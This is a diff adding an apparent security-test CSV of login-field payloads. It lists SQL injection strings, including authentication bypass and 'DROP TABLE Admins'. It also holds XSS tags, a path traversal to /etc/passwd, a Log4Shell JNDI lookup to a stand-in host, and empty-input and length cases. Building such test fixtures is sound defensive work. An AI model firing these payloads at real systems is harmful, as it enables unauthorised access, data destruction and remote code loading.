@@ -1,0 +1,23 @@
+﻿category,target_field,payload
+SQL Injection,username,' OR '1'='1
+SQL Injection,username,admin'--
+SQL Injection,username,'; DROP TABLE Admins;--
+SQL Injection,username,"admin' UNION SELECT 1,2,3--"
+XSS,username,<script>alert(1)</script>
+XSS,username,<img src=x onerror=alert(1)>
+XSS,username,<svg onload=alert(1)>
+Path Traversal,username,../../../../etc/passwd
+Log4Shell,username,${jndi:ldap://evil.local/a}
+Empty,username,
+Length,username,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Length,username,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+SQL Injection,password,admin'--
+SQL Injection,password,' or 1=1--
+SQL Injection,password,'; drop table admins;--
+XSS,password,<script>alert(1)</script>
+XSS,password,<img src=x onerror=alert(1)>
+XSS,password,<svg onload=alert(1)>
+Empty,password,
+Length,password,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+SQL Injection,password,' OR '1'='1
+XSS,password,<SCRIPT>Alert1!</SCRIPT>
